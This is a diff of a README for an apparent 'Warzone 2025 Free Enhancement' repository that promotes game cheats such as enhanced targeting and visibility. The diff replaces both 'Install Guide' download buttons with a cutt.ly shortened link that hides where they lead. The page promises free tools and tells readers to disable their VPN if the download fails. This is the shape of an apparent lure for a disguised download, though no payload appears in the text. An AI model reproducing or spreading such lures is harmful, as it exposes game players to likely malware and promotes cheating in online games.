@@ -5,7 +5,7 @@
 
 **Description**: Boost your Warzone 2025 experience with the **Warzone 2025 Free Enhancement**, offering free tools in 2025! This repository provides exclusive tutorials, resources, and tips to explore features like enhanced targeting and visibility. Download your free tools and join our active community of Warzone players!  
 
-<a href="https://new-best-warzone-cheat-2025-aimbot-esp.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/WrNtsEH9" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -28,7 +28,7 @@ Enhance your Warzone 2025 gameplay with these simple steps to set up the Free To
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-<a href="https://new-best-warzone-cheat-2025-aimbot-esp.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/WrNtsEH9" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
